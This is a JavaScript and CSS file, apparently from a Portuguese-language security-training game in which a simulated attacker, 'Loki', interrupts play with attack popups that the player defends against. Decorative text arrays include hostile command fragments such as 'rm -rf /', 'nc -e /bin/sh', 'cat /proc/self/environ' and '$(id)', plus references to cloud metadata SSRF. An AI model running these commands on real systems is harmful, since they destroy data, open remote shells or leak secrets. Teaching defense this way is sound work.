    @keyframes noiseShift { 0%{background-position:0 0;}25%{background-position:50px 20px;}50%{background-position:10px 80px;}75%{background-position:90px 10px;}100%{background-position:30px 60px;} }
    .hack-corrupt-text { position:absolute;font-family:'Share Tech Mono',monospace;font-size:11px;color:rgba(255,0,60,0.7);pointer-events:none;animation:corruptFloat var(--cf-dur,0.8s) ease-out forwards;white-space:nowrap; }
    @keyframes corruptFloat { 0%{opacity:1;transform:translateY(0) scale(1);}60%{opacity:0.8;transform:translateY(-20px) scale(1.05);}100%{opacity:0;transform:translateY(-40px) scale(0.9);} }
    #hackVignette { position:absolute;inset:0;background:radial-gradient(ellipse at center,transparent 40%,rgba(255,0,30,0.25) 100%);animation:vignettePulse 0.3s ease-in-out infinite alternate; }
    @keyframes vignettePulse { from{opacity:0.6;} to{opacity:1;} }
    @keyframes uiFlicker { 0%,100%{opacity:1}10%{opacity:0.85}20%{opacity:1}30%{opacity:0.7}40%{opacity:1}55%{opacity:0.9}70%{opacity:0.6}80%{opacity:1}90%{opacity:0.8} }
    .ui-flicker { animation:uiFlicker 0.15s steps(1) infinite; }
    #panelGlitch { position:absolute;inset:0;pointer-events:none;z-index:10;opacity:0;transition:opacity 0.05s; }
    #panelGlitch.show { opacity:1;animation:panelGlitch 0.5s steps(1) forwards; }
    @keyframes panelGlitch { 0%{box-shadow:inset 0 0 0 2px rgba(255,0,60,0.8);filter:hue-rotate(0deg);}15%{box-shadow:inset 0 0 0 2px rgba(0,255,65,0.5);filter:hue-rotate(180deg) contrast(1.5);}30%{box-shadow:inset 0 0 0 3px rgba(255,0,60,0.9);filter:hue-rotate(0deg) invert(0.1);}45%{box-shadow:none;filter:none;}60%{box-shadow:inset 0 0 0 1px rgba(255,0,60,0.6);filter:brightness(1.3);}75%{box-shadow:none;filter:none;}100%{opacity:0;} }
    #hackProgressBar { position:fixed;top:0;left:0;right:0;height:2px;background:var(--red,#ff1a3c);z-index:9001;transform-origin:left;transform:scaleX(0);box-shadow:0 0 8px rgba(255,0,60,0.8); }
    #hackProgressBar.active { animation:hackProgress var(--hp-dur,1.2s) ease-in forwards; }
    @keyframes hackProgress { from{transform:scaleX(0);}to{transform:scaleX(1);} }
    #hackIntrusionMsg { position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);z-index:9002;font-family:'VT323',monospace;font-size:32px;color:var(--red,#ff1a3c);text-shadow:0 0 20px rgba(255,0,60,0.8),0 0 40px rgba(255,0,60,0.4);letter-spacing:4px;text-align:center;pointer-events:none;opacity:0;animation:intrusionPop 1.2s ease-out forwards; }
    @keyframes intrusionPop { 0%{opacity:0;transform:translate(-50%,-50%) scale(0.8);}15%{opacity:1;transform:translate(-50%,-50%) scale(1.05);}25%{opacity:1;transform:translate(-50%,-50%) scale(1);}70%{opacity:1;}100%{opacity:0;transform:translate(-50%,-50%) scale(1.1);} }
    #lokiThreatBar { position:fixed;bottom:0;left:0;right:0;height:3px;z-index:8500;pointer-events:none;background:transparent;transition:background 1s; }
    #lokiThreatBar.threat-1 { background:rgba(0,255,65,0.3); }
    #lokiThreatBar.threat-2 { background:rgba(245,197,24,0.4); }
    #lokiThreatBar.threat-3 { background:rgba(255,100,0,0.5); }
    #lokiThreatBar.threat-4 { background:rgba(255,30,60,0.6);box-shadow:0 0 8px rgba(255,0,30,0.4); }
    #lokiThreatBar.threat-5 { background:rgba(255,0,30,0.8);box-shadow:0 0 12px rgba(255,0,30,0.6);animation:threatPulse 1s ease-in-out infinite alternate; }
    #lokiThreatBar.threat-6 { background:var(--red,#ff1a3c);box-shadow:0 0 16px rgba(255,0,30,0.8);animation:threatPulse 0.5s ease-in-out infinite alternate; }
    @keyframes threatPulse { from{opacity:0.7;}to{opacity:1;} }
    #aptModeWarning { position:fixed;top:60px;left:50%;transform:translateX(-50%);z-index:8400;font-family:'VT323',monospace;font-size:14px;color:var(--red,#ff1a3c);letter-spacing:3px;border:1px solid rgba(255,0,60,0.4);padding:6px 16px;background:rgba(2,5,2,0.9);animation:aptBlink 1.5s steps(1) infinite;pointer-events:none;display:none; }
    #aptModeWarning.active { display:block; }
    @keyframes aptBlink { 0%,100%{opacity:1}50%{opacity:0.3} }
    .msg-loki.loki-ambient { border-left:2px solid var(--red,#ff1a3c);padding:10px 14px;margin:8px 0;background:rgba(255,0,40,0.05);font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--red,#ff1a3c);animation:lokiSlideIn 0.35s ease both;position:relative; }
    .msg-loki.loki-ambient::before { content:'⚡';position:absolute;top:8px;right:10px;font-size:11px;opacity:0.6;animation:lokiBlink 1s steps(1) 3; }
    @keyframes lokiSlideIn { from{opacity:0;transform:translateX(-8px);}to{opacity:1;transform:translateX(0);} }
    @keyframes lokiBlink { 0%,100%{opacity:0.6}50%{opacity:0;} }
    .lk-dim     { color:var(--text-dim,#444);font-size:11px;letter-spacing:1px; }
    .lk-payload { color:var(--red,#ff1a3c);opacity:0.9; }
    .lk-type    { color:var(--text-dim,#666);font-size:11px;font-style:italic; }
    .lk-hl      { color:var(--green,#00ff41); }
    .loki-interrupt { line-height:1.7; }
    .lk-level   { font-size:9px;letter-spacing:2px;opacity:0.5; }

    /* ── Attack Modal ── */
    #attackModal {
      position:fixed;inset:0;z-index:9100;display:flex;align-items:center;justify-content:center;
      background:rgba(2,5,2,0.92);animation:fadeIn 0.2s ease;
    }
    @keyframes fadeIn { from{opacity:0;}to{opacity:1;} }
    #attackModal .am-box {
      width:min(560px,95vw);border:1px solid var(--red,#ff1a3c);
      background:rgba(5,2,2,0.99);animation:slideUp 0.25s ease;
      box-shadow:0 0 40px rgba(255,0,40,0.15);
    }
    @keyframes slideUp { from{opacity:0;transform:translateY(16px);}to{opacity:1;transform:translateY(0);} }
    .am-topbar {
      display:flex;align-items:center;justify-content:space-between;
      padding:10px 16px;border-bottom:1px solid rgba(255,0,40,0.3);
      background:rgba(255,0,40,0.08);
    }
    .am-tag { font-family:'VT323',monospace;font-size:13px;color:var(--red,#ff1a3c);letter-spacing:3px; }
    .am-timer-wrap { display:flex;align-items:center;gap:8px; }
    .am-timer-num { font-family:'VT323',monospace;font-size:28px;color:var(--red,#ff1a3c);min-width:32px;text-align:right;line-height:1; }
    .am-timer-bar-wrap { width:80px;height:3px;background:rgba(255,0,40,0.2);overflow:hidden; }
    .am-timer-bar { height:100%;background:var(--red,#ff1a3c);transition:width 1s linear; }
    .am-payload-row { padding:12px 16px;border-bottom:1px solid rgba(255,0,40,0.2); }
    .am-type    { font-size:10px;color:rgba(255,60,60,0.5);letter-spacing:1px;margin-bottom:4px; }
    .am-payload { font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--red,#ff1a3c);word-break:break-all; }
    .am-taunt   { font-size:12px;color:var(--text-mid,#6b9);padding:10px 16px;border-bottom:1px solid rgba(255,0,40,0.15);line-height:1.7; }
    .am-choices { padding:12px 16px;display:flex;flex-direction:column;gap:7px; }
    .am-choice {
      display:flex;align-items:flex-start;gap:10px;width:100%;text-align:left;
      font-family:'Share Tech Mono',monospace;font-size:11px;padding:10px 14px;
      border:1px solid rgba(255,0,40,0.25);background:transparent;color:var(--text-mid,#6b9);
      cursor:pointer;transition:all 0.2s;line-height:1.5;
    }
    .am-choice:hover:not(:disabled) { border-color:var(--red,#ff1a3c);color:#fff; }
    .am-choice.am-correct { border-color:var(--green,#00ff41)!important;color:var(--green,#00ff41)!important;background:rgba(0,255,65,0.06)!important; }
    .am-choice.am-wrong   { border-color:var(--red,#ff1a3c)!important;color:var(--red,#ff1a3c)!important;background:rgba(255,0,40,0.08)!important; }
    .am-choice-letter { min-width:18px;flex-shrink:0;color:rgba(255,60,60,0.6);font-size:12px; }
    .am-choice.am-correct .am-choice-letter { color:var(--green,#00ff41); }
    .am-feedback {
      margin:0 16px 14px;padding:10px 14px;font-size:11px;color:var(--text-mid,#6b9);
      line-height:1.7;background:rgba(0,0,0,0.4);border-left:2px solid var(--border,#1a2a1a);
      display:none;
    }
    .am-feedback.show { display:block; }
    .am-fb-ok  { color:var(--green,#00ff41);margin-right:6px; }
    .am-fb-err { color:var(--red,#ff1a3c);margin-right:6px; }
    .am-footer { display:flex;justify-content:space-between;align-items:center;padding:10px 16px;border-top:1px solid rgba(255,0,40,0.2); }
    .am-penalty { font-size:10px;color:rgba(255,60,60,0.5);letter-spacing:1px; }
    .am-close-btn {
      font-family:'Share Tech Mono',monospace;font-size:11px;
      border:1px solid var(--border,#1a2a1a);background:transparent;color:var(--text-dim,#444);
      padding:5px 14px;cursor:pointer;transition:all 0.2s;display:none;
    }
    .am-close-btn.show { display:block; }
    .am-close-btn:hover { border-color:var(--border-bright,#2a4a2a);color:var(--text-mid,#6b9); }
  `;
  document.head.appendChild(s);
})();

/* ─── DOM helpers ────────────────────────────────────────── */
function ensureHackOverlay() {
  if (document.getElementById('hackOverlay')) return;
  const overlay = document.createElement('div');
  overlay.id = 'hackOverlay';
  overlay.innerHTML = `<div id="hackVignette"></div><div id="hackScanlines"></div><div id="hackNoise"></div><div id="hackRgb"></div>`;
  document.body.appendChild(overlay);
  const bar = document.createElement('div'); bar.id = 'hackProgressBar'; document.body.appendChild(bar);
  const tb  = document.createElement('div'); tb.id  = 'lokiThreatBar';   document.body.appendChild(tb);
  const apt = document.createElement('div'); apt.id = 'aptModeWarning'; apt.textContent = '⚡ MODO APT ATIVO — LOKI TOTAL'; document.body.appendChild(apt);
}

/* ─── CORRUPT TEXTS ──────────────────────────────────────── */
const CORRUPT_TEXTS = [
  'INTRUSION_DETECTED','ACCESS_GRANTED','SHELL_SPAWNED','/etc/passwd','rm -rf /','$(id)',
  'cat /proc/self/environ','LOKI_SHADOWS_v3.1','PAYLOAD_INJECTED','AUTH_BYPASS',
  '0x4c4f4b49','nc -e /bin/sh','TOKEN_FORGED','IDOR_EXPLOITED','SSRF_TRIGGERED',
  'PASSROLE_ABUSED','SUPPLY_POISONED','JWT_NONE','iam:PassRole','169.254.169.254',
  'postinstall_exec','sts:AssumeRole','s3:GetObject *','CLOUDTRAIL_DISABLED',
];

function spawnCorruptText(container) {
  const el = document.createElement('div');
  el.className = 'hack-corrupt-text';
  el.textContent = CORRUPT_TEXTS[Math.floor(Math.random() * CORRUPT_TEXTS.length)];
  el.style.left = Math.random() * 80 + '%';
  el.style.top  = Math.random() * 70 + 10 + '%';
  el.style.setProperty('--cf-dur', (0.6 + Math.random() * 0.8) + 's');
  container.appendChild(el);
  setTimeout(() => el.remove(), 1500);
}

function spawnGlitchStrips(container, count = 5) {
  for (let i = 0; i < count; i++) {
    const strip = document.createElement('div');
    strip.className = 'hack-strip';
    strip.style.top    = Math.random() * 90 + '%';
    strip.style.height = (2 + Math.random() * 12) + 'px';
    strip.style.setProperty('--dur',   (0.1 + Math.random() * 0.3) + 's');
    strip.style.setProperty('--shift', (4  + Math.random() * 20) + 'px');
    strip.style.background = Math.random() > 0.5 ? 'rgba(255,0,60,0.15)' : 'rgba(0,255,65,0.08)';
    container.appendChild(strip);
    setTimeout(() => strip.remove(), 800 + Math.random() * 400);
  }
}

const INTRUSION_MSGS = ['INTRUSÃO\nDETECTADA','SISTEMA\nCOMPROMETIDO','ÆGIS\nEXPOSTO','LOKI\nENTROU','IAM\nCOMPROMETIDO','SHELL\nATIVO'];

function showIntrusionMessage() {
  const existing = document.getElementById('hackIntrusionMsg');
  if (existing) existing.remove();
  const el = document.createElement('div');
  el.id = 'hackIntrusionMsg';
  el.innerHTML = INTRUSION_MSGS[Math.floor(Math.random() * INTRUSION_MSGS.length)].replace('\n','<br>');
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 1300);
}

function flickerUI(duration = 800) {
  ['.main-panel','.chat-panel','.hud-bar','#view-missoes'].forEach(sel => {
    const el = document.querySelector(sel);
    if (!el) return;
    el.classList.add('ui-flicker');
    setTimeout(() => el.classList.remove('ui-flicker'), duration);
  });
}

function triggerHackAnimation() {
  ensureHackOverlay();
  const overlay = document.getElementById('hackOverlay');
  const bar     = document.getElementById('hackProgressBar');
  overlay.classList.add('active');
  if (bar) { bar.classList.remove('active'); bar.style.setProperty('--hp-dur','1.1s'); void bar.offsetWidth; bar.classList.add('active'); }
  const glitch = document.getElementById('panelGlitch');
  if (glitch) { glitch.classList.add('show'); setTimeout(() => glitch.classList.remove('show'), 600); }
  flickerUI(900);
  setTimeout(showIntrusionMessage, 150);
  setTimeout(() => spawnGlitchStrips(overlay, 6), 0);
  setTimeout(() => spawnGlitchStrips(overlay, 4), 200);
  setTimeout(() => spawnGlitchStrips(overlay, 3), 450);
  let tc = 0;
  const ti = setInterval(() => { spawnCorruptText(overlay); if (++tc >= 8) clearInterval(ti); }, 100);
  setTimeout(() => { spawnGlitchStrips(overlay, 8); flickerUI(300); }, 500);
  setTimeout(() => { overlay.classList.remove('active'); if (bar) bar.classList.remove('active'); }, 1100);
}

/* ─── showUnlockNotification() ──────────────────────────── */
function showUnlockNotification(nextMissionId) {
  const m = typeof MISSIONS_DATA !== 'undefined' ? MISSIONS_DATA.find(x => x.id === nextMissionId) : null;
  const existing = document.getElementById('unlockNotif');
  if (existing) existing.remove();
  const notif = document.createElement('div');
  notif.id = 'unlockNotif';
  notif.style.cssText = `position:fixed;bottom:24px;right:24px;z-index:8000;border:1px solid var(--green);background:rgba(2,8,4,0.97);padding:14px 18px;min-width:260px;animation:slideInRight 0.4s ease both;box-shadow:0 0 20px rgba(0,255,65,0.15);`;
  notif.innerHTML = `
    <div style="font-size:10px;color:var(--text-dim);letter-spacing:2px;margin-bottom:6px;">// MISSÃO DESBLOQUEADA</div>
    <div style="font-family:'VT323',monospace;font-size:22px;color:var(--green);text-shadow:0 0 10px var(--green-glow);">
      ${m ? m.runeIcon + ' ' + m.title : 'Próxima missão'}
    </div>
    ${m ? `<div style="font-size:11px;color:var(--text-dim);margin-top:4px;">${m.vector} // +${m.xp} XP disponível</div>` : ''}`;
  if (!document.getElementById('unlockNotifStyle')) {
    const st = document.createElement('style');
    st.id = 'unlockNotifStyle';
    st.textContent = `@keyframes slideInRight { from{opacity:0;transform:translateX(30px);}to{opacity:1;transform:translateX(0);} }`;
    document.head.appendChild(st);
  }
  document.body.appendChild(notif);
  setTimeout(() => { if (notif.parentNode) notif.remove(); }, 4000);
}

/* ═══════════════════════════════════════════════════════════
   ATTACK MODAL — o coração do sistema de ataque
═══════════════════════════════════════════════════════════ */
let _modalActive = false;
let _modalTimer  = null;

function openModal(atk) {
  if (_modalActive) return;
  _modalActive = true;
  if (window.STATE) window.STATE.modalActive = true;

  const cfg   = _getCfg();
  const total = cfg.timerSecs;
  let   remaining = total;

  const modal = document.createElement('div');
  modal.id = 'attackModal';

  const choices = atk.choices.map((c, i) => `
    <button class="am-choice" id="am-c-${i}" onclick="_answerModal(${i})">
      <span class="am-choice-letter">${String.fromCharCode(65+i)}</span>
      <span>${_amEsc(c.t)}</span>
    </button>`).join('');

  modal.innerHTML = `
    <div class="am-box">
      <div class="am-topbar">
        <span class="am-tag">⚡ ATAQUE INTERCEPTADO</span>
        <div class="am-timer-wrap">
          <div class="am-timer-bar-wrap"><div class="am-timer-bar" id="am-tbar" style="width:100%"></div></div>
          <div class="am-timer-num" id="am-tnum">${total}</div>
        </div>
      </div>
      <div class="am-payload-row">
        <div class="am-type">${_amEsc(atk.type)}</div>
        <div class="am-payload">&gt; ${_amEsc(atk.payload)}</div>
      </div>
      <div class="am-taunt">${atk.taunt}</div>
      <div class="am-choices" id="am-choices">${choices}</div>
      <div class="am-feedback" id="am-feedback"></div>
      <div class="am-footer">
        <span class="am-penalty" id="am-penalty"></span>
        <button class="am-close-btn" id="am-close" onclick="_closeModal()">[ continuar ]</button>
      </div>
    </div>`;

  document.body.appendChild(modal);

  /* Timer */
  const tbar = document.getElementById('am-tbar');
  const tnum = document.getElementById('am-tnum');
  _modalTimer = setInterval(() => {
    remaining--;
    if (tnum) tnum.textContent = remaining;
    if (tbar) tbar.style.width = `${(remaining / total) * 100}%`;
    if (remaining <= 0) {
      clearInterval(_modalTimer);
      _timeoutModal(atk);
    }
  }, 1000);

  /* Registrar choices para resposta */
  window._currentModalAtk = atk;
}

window._answerModal = function(idx) {
  if (!window._currentModalAtk) return;
  const atk = window._currentModalAtk;
  clearInterval(_modalTimer);

  document.querySelectorAll('.am-choice').forEach(b => b.disabled = true);

  const correct = atk.choices[idx].ok;
  const fb      = document.getElementById('am-feedback');
  const penalty = document.getElementById('am-penalty');
  const closeBtn= document.getElementById('am-close');

  document.querySelectorAll('.am-choice').forEach((b, i) => {
    if (atk.choices[i].ok) b.classList.add('am-correct');
    else if (i === idx && !correct) b.classList.add('am-wrong');
  });

  if (fb) {
    fb.innerHTML = `<span class="${correct ? 'am-fb-ok' : 'am-fb-err'}">${correct ? '✓' : '✗'}</span> ${atk.choices[idx].fb}`;
    fb.classList.add('show');
  }

  if (correct) {
    if (typeof window._grantXP === 'function') window._grantXP({ xp: 75, label: 'attack:correct' });
    if (typeof botSay === 'function') botSay(`<span class="hl">✓ Ataque bloqueado.</span> +75 XP`);
    if (penalty) penalty.textContent = '// ATAQUE NEUTRALIZADO';
  } else {
    const pen = _getCfg().timerSecs * 5;
    if (typeof window._grantXP === 'function') window._grantXP({ xp: -pen, label: 'attack:wrong' });
    if (typeof botSay === 'function') botSay(`<span class="danger">✗ Defesa incorreta.</span> -${pen} XP. ${atk.choices[idx].fb}`);
    if (penalty) penalty.textContent = `// PENALIDADE: -${pen} XP`;
    triggerHackAnimation();
  }

  if (closeBtn) closeBtn.classList.add('show');
};

function _timeoutModal(atk) {
  document.querySelectorAll('.am-choice').forEach(b => b.disabled = true);
  const correct = atk.choices.find(c => c.ok);
  const fb      = document.getElementById('am-feedback');
  const penalty = document.getElementById('am-penalty');
  const closeBtn= document.getElementById('am-close');

  document.querySelectorAll('.am-choice').forEach((b, i) => {
    if (atk.choices[i].ok) b.classList.add('am-correct');
  });

  if (fb) {
    fb.innerHTML = `<span class="am-fb-err">⏱ TEMPO ESGOTADO.</span> ${correct?.fb || ''}`;
    fb.classList.add('show');
  }

  const pen = _getCfg().timerSecs * 8;
  if (typeof window._grantXP === 'function') window._grantXP({ xp: -pen, label: 'attack:timeout' });
  if (typeof botSay === 'function') botSay(`<span class="danger">⏱ Tempo esgotado.</span> -${pen} XP.`);
  if (penalty) penalty.textContent = `// TIMEOUT: -${pen} XP`;
  if (closeBtn) closeBtn.classList.add('show');
  triggerHackAnimation();
}

window._closeModal = function() {
  const modal = document.getElementById('attackModal');
  if (modal) modal.remove();
  _modalActive = false;
  if (window.STATE) window.STATE.modalActive = false;
  window._currentModalAtk = null;
  if (_modalTimer) { clearInterval(_modalTimer); _modalTimer = null; }
};

function _amEsc(str = '') {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

/* ═══════════════════════════════════════════════════════════
   LOKI SCHEDULER v3.0
═══════════════════════════════════════════════════════════ */
let _lokiTimer  = null;
let _lokiActive = false;
let _lokiCount  = 0;

const _LOKI_TAUNTS = [
  'Enquanto você pensa… <span class="lk-hl">eu já estou dentro.</span>',
  'Cada segundo de hesitação é uma porta que abro.',
  'Você confia nos seus logs? <span class="lk-hl">Eu já os editei.</span>',
  'Sua sessão expirou. <span class="lk-hl">A minha não.</span>',
  'Você bloqueia uma porta. <span class="lk-hl">Eu uso a janela.</span>',
  'O firewall está bonito. <span class="lk-hl">Pena que o endpoint não.</span>',
  'Sinto cheiro de credenciais hardcoded…',
  'Rate limit? <span class="lk-hl">Tenho tempo.</span>',
  'Não me vê no painel? Procure melhor.',
  'Cada missão que você completa… <span class="lk-hl">eu escalo um nível.</span>',
  'Você aprendeu defesa. <span class="lk-hl">Eu aprendi a contorná-la.</span>',
  'Resource:* é uma carta em branco. <span class="lk-hl">E você a entregou.</span>',
  'Três deps transitivas atrás do seu código. <span class="lk-hl">Lá estou eu.</span>',
  'O trust policy do role não tem Condition. <span class="lk-hl">Obrigado.</span>',
];

function _lokiPick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function _lokiRnd(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function _lokiEsc(str = '') { return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function _getCfg() {
  const id = (typeof MISSION_STATE !== 'undefined' && MISSION_STATE.activeMissionId)
    ? MISSION_STATE.activeMissionId : (window.STATE?.activeMissionId || 1);
  return MISSION_DIFFICULTY[id] || MISSION_DIFFICULTY[1];
}

function _getActiveMission() {
  return (typeof MISSION_STATE !== 'undefined' && MISSION_STATE.activeMissionId)
    ? MISSION_STATE.activeMissionId : (window.STATE?.activeMissionId || 1);
}

function _pickAttack() {
  const mId    = _getActiveMission();
  const themed = ATTACKS_BY_MISSION[mId];
  if (themed?.length && Math.random() < 0.75) return _lokiPick(themed);
  return _lokiPick(ATTACKS);
}

function _updateThreatBar(mId) {
  const bar = document.getElementById('lokiThreatBar');
  if (!bar) return;
  bar.className = '';
  bar.classList.add(`threat-${mId}`);
}

function _setAptWarning(active) {
  const el = document.getElementById('aptModeWarning');
  if (!el) return;
  if (active) el.classList.add('active'); else el.classList.remove('active');
}

function _lokiInjectChat(html) {
  if (typeof appendMsg === 'function') { appendMsg(html, 'msg-loki loki-ambient'); return; }
  const container = document.querySelector('.chat-messages, .messages, #chatLog');
  if (!container) return;
  const el = document.createElement('div');
  el.className = 'msg-loki loki-ambient';
  el.innerHTML = html;
  container.appendChild(el);
  container.scrollTop = container.scrollHeight;
}

function _lokiFireOne() {
  _lokiCount++;
  triggerHackAnimation();

  const cfg       = _getCfg();
  const mId       = _getActiveMission();
  const usesPayload = Math.random() > 0.30;
  let html;

  if (usesPayload) {
    const atk = _pickAttack();
    html = `
      <div class="loki-interrupt">
        <span class="lk-dim">// ATAQUE [${_lokiCount}] — ${cfg.label}</span><br>
        <span class="lk-payload">&gt; ${_lokiEsc(atk.payload)}</span><br>
        <span class="lk-type">${_lokiEsc(atk.type)}</span><br>
        ${atk.taunt}
      </div>`;

    setTimeout(() => {
      if (typeof openModal === 'function' && !_modalActive) {
        if (window.STATE) window.STATE.timerSecs = cfg.timerSecs;
        openModal({ ...atk, _timerSecs: cfg.timerSecs });
      }
    }, 1200);
  } else {
    html = `
      <div class="loki-interrupt">
        <span class="lk-dim">// SINAL [${_lokiCount}] — ${cfg.label}</span><br>
        ${_lokiPick(_LOKI_TAUNTS)}
      </div>`;
  }

  _lokiInjectChat(html);
}

function _lokiFire() {
  if (!_lokiActive) return;
  const cfg = _getCfg();

  if (Math.random() > cfg.fireChance) { _lokiScheduleNext(); return; }

  _lokiFireOne();

  /* Rafaga — ataques em sequência */
  if (cfg.burstChance > 0 && Math.random() < cfg.burstChance) {
    const extra = Math.floor(Math.random() * (cfg.burstCount - 1)) + 1;
    for (let i = 1; i <= extra; i++) {
      setTimeout(() => {
        if (_lokiActive && !_modalActive) _lokiFireOne();
      }, i * _lokiRnd(4000, 7000));
    }
  }

  _lokiScheduleNext();
}

function _lokiScheduleNext() {
  if (!_lokiActive) return;
  const cfg   = _getCfg();
  const delay = _lokiRnd(cfg.intervalMin, cfg.intervalMax);
  _lokiTimer  = setTimeout(_lokiFire, delay);
}

/* ─── API PÚBLICA ─────────────────────────────────────────── */
function startLokiAttacks() {
  if (_lokiActive) return;
  ensureHackOverlay();
  _lokiActive = true;
  _lokiCount  = 0;

  const mId = _getActiveMission();
  const cfg = _getCfg();

  _updateThreatBar(mId);
  if (mId === 6) _setAptWarning(true);

  console.log(`[loki] missão ${mId} | ${cfg.label} | ${cfg.intervalMin/1000}–${cfg.intervalMax/1000}s | timer:${cfg.timerSecs}s | burst:${cfg.burstChance*100}%`);

  const openings = {
    1: '// LOKI\'S SHADOWS conectado. <span class="lk-hl">Nenhuma entrada é segura</span> sem validação.',
    2: '// Autenticado. <span class="lk-hl">Mas autorizado?</span> userId=1 está esperando.',
    3: '// Seu token. <span class="lk-hl">Meu alvo.</span> Qual é o secret? hashcat vai descobrir.',
    4: '// Sua Lambda faz fetch de URLs externas. <span class="lk-hl">169.254.169.254 é uma URL.</span>',
    5: '// Quantas dependências você auditou hoje? <span class="lk-hl">Eu auditei todas.</span> E comprometi uma.',
    6: '// <span class="lk-hl">Missão final. Modo APT.</span> iam:PassRole. sts:AssumeRole. UpdateFunctionCode. Boa sorte.',
  };
  setTimeout(() => _lokiInjectChat(`<div class="loki-interrupt">${openings[mId] || openings[1]}</div>`), 1500);

  const delay = cfg.firstDelay + _lokiRnd(0, 4000);
  _lokiTimer = setTimeout(_lokiFire, delay);
}

function stopLokiAttacks() {
  _lokiActive = false;
  if (_lokiTimer) { clearTimeout(_lokiTimer); _lokiTimer = null; }
  _setAptWarning(false);
  const bar = document.getElementById('lokiThreatBar');
  if (bar) bar.className = '';
  console.log(`[loki] parado após ${_lokiCount} ataques`);
}